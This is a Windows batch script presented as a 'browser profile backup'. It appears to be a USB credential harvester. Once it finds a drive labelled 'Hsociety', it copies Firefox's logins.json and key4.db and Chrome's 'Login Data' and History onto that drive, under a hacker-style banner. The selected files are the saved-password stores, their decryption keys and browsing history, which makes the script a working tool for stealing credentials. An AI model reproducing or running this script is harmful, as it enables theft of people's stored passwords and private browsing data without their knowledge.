@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: ===============================
:: ProfilesBackup v1.1
:: Wsuits6 Browser Profile Extractor
:: ===============================

:: ---- CONFIG ----
set "USB_LABEL=Hsociety"
set "BASE_DIR=ProfilesBackup"

set "FIREFOX_BASE=%APPDATA%\Mozilla\Firefox\Profiles"
set "CHROME_BASE=%LOCALAPPDATA%\Google\Chrome\User Data\Default"

:: ---- Detect USB drive ----
for /f "skip=1 tokens=1,2" %%A in ('wmic logicaldisk get Name^,VolumeName') do (
    if /I "%%B"=="%USB_LABEL%" set "USB_DRIVE=%%A"
)

if not defined USB_DRIVE (
    echo [!] USB drive with label "%USB_LABEL%" not found.
    pause
    exit /b 1
)

:: ---- Safe timestamp ----
for /f %%i in ('wmic os get localdatetime ^| find "."') do set dt=%%i
set "TIMESTAMP=%dt:~0,4%-%dt:~4,2%-%dt:~6,2%_%dt:~8,2%-%dt:~10,2%-%dt:~12,2%"

set "OUTDIR=%USB_DRIVE%\%BASE_DIR%\Backup_%TIMESTAMP%"
set "LOGFILE=%OUTDIR%\backup.log"

mkdir "%OUTDIR%" >nul 2>&1

:: ---- Banner (now earned) ----
echo.
echo ███████╗███████╗██╗   ██╗██╗████████╗███████╗
echo ██╔════╝██╔════╝██║   ██║██║╚══██╔══╝██╔════╝
echo ███████╗███████╗██║   ██║██║   ██║   ███████╗
echo ╚════██║╚════██║██║   ██║██║   ██║   ╚════██║
echo ███████║███████║╚██████╔╝██║   ██║   ███████║
echo ╚══════╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
echo.
echo [+] USB detected: %USB_DRIVE%
echo [+] Output directory: %OUTDIR%
echo.

:: ---- Firefox ----
if exist "%FIREFOX_BASE%" (
    echo [+] Copying Firefox profiles...
    for /d %%P in ("%FIREFOX_BASE%\*") do (
        set "FF_OUT=%OUTDIR%\Firefox\%%~nP"
        mkdir "!FF_OUT!" >nul 2>&1

        robocopy "%%P" "!FF_OUT!" places.sqlite logins.json key4.db prefs.js /NFL /NDL /NJH /NJS /NC /NS >> "%LOGFILE%"
    )
) else (
    echo [-] Firefox not found. >> "%LOGFILE%"
)

:: ---- Chrome ----
if exist "%CHROME_BASE%" (
    echo [+] Copying Chrome profile...
    set "CH_OUT=%OUTDIR%\Chrome"
    mkdir "%CH_OUT%" >nul 2>&1

    robocopy "%CHROME_BASE%" "%CH_OUT%" Bookmarks "Login Data" Preferences History /NFL /NDL /NJH /NJS /NC /NS >> "%LOGFILE%"
) else (
    echo [-] Chrome not found. >> "%LOGFILE%"
)

echo.
echo [+] Backup complete.
echo [+] Log file: %LOGFILE%
pause
